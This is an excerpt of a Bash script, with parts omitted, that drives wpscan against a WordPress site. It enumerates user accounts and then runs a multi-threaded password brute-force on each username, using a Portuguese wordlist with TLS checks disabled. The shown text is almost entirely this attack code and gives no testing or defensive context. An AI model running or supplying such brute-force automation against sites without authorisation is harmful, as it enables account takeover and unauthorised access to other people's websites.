...
function user_enumeration () {
    ...
    wpscan --url https://"$website_url" --ignore-main-redirect --enumerate u > user_enum.txt
...
function force_brute () {
        ...
        wpscan --url https://"$website_url" --ignore-main-redirect --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
    done
}
